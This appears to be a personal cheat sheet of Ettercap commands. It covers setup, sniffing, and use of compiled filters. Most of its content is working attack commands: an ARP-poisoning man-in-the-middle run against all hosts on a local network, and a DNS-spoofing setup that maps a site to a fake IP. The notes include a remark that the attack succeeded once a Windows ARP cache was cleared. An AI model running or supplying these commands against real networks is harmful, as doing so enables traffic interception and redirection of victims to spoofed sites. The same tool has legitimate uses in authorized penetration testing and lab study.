


#Initial Setup of Ettercap

nano /etc/ettercap/etter.conf
ec_uid=0
ec_guid=0
uncomment, iptables #redir…

#Sample Usage

ettercap -C -->curses GUI
ettercap -G
        unified sniffing->scan for hosts->select targets->sniff remote conn


#Sample DNS attack

nano /etc/ettercap/etter.dns
my_site.com	A	fake_ip
*.my_site.com	A	fake_ip

ettercap -T -q -M arp -P dns_spoof // // -i eth0
   -T: Specifies the use of the text-based interface
   -q: Runs commands in quiet mode
   -P dns_spoof: Specifies the use of the dns_spoof plug-in
   -M arp: Initiates a MITM ARP poisoning attack to intercept packets between hosts

# ettercap-filters

$ etterfilter my_filter.filter -o my_filter.ef

ettercap -T -q -F my_filter.ef -M ARP // //  ( ---->it worked after arp -d * in windows) 

